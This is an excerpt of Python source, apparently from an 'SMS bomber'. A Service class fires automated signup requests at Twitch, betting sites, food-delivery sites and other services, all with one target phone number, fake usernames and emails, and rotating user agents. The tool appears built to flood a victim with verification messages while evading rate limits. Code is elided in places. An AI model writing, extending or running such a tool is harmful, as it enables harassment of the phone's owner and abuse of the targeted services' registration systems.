...
class Service():
    ...
    def menuau(self):
        requests.post('https://www.menu.ua/kiev/delivery/registration/direct-registration.html',
         ...
         'user_info[password]':"helloworld22H@3",
         'user_info[conf_password]':"helloworld22H@3"})
    ...
    def carte(self):
        headers = {'X-Requested-With':'XMLHttpRequest',
         ...
         'User-Agent':user_agent(),
         'DNT':'1'}
        requests.post('https://carte.by/auth/', data={'ajax':'register',  'login':username(),  'pass':"helloworld22H@3",  'phone':self.phone,  'company':0,  'resend':1,  'checksum':504}, headers=headers)
    ...
    def bettery_ru(self):
        headers = {'X-Requested-With':'XMLHttpRequest',
         ...
         'User-Agent':user_agent(),
         'DNT':'1'}
        requests.post('https://clientsapi02.at-resources.com/cps/superRegistration/createProcess', headers=headers, json={'fio':'Алексей',  'password':'helloworld22H@3',  'email':email(),  'emailAdvertAccepted':'true',  'phoneNumber':self.phone,  'webReferrer':'',  'advertInfo':'',  'platformInfo':agent,  'promoId':'',  'sysId':1,  'lang':'ru'})
    ...
    def passporttwitchtv_two(self):
        headers_copy = data_headers
        headers_copy['User-Agent'] = user_agent()
        requests.post('https://passport.twitch.tv/register?trusted_request=true', headers=headers_copy, json={'birthday':{'day':1,  'month':9,  'year':1997},  'client_id':'kd1unb4b3q4t58fwlpcbzcbnm76a8fp',  'include_verification_code':True,  'password':"helloworld22H@3",  'phone_number':self.phone_not_pluse,  'username':username()})
    ...
    def ggbetru(self):
        headers_copy = data_headers
        headers_copy['User-Agent'] = user_agent()
        requests.post('https://ggbet.ru/api/auth/register-with-phone', headers=headers_copy, data={'phone':self.phone,  'login':email(),  'password':"helloworld22H@3",  'agreement':'on',  'oferta':'on'})
    ...
    def apizenkyio(self):
        ...
        phone = phone_mask(self.phone_not_pluse, "+# (###) ###-##-##")
        requests.post('https://api.zenky.io/v2/auth/register', json={'phone':phone, 'phone_country': "RU", 'password': "helloworld22H@3"}, headers={'User-Agent':headers_copy,'x-store-id': '92037185-cce3-45dd-bf11-b52fe4a9cdc1'})
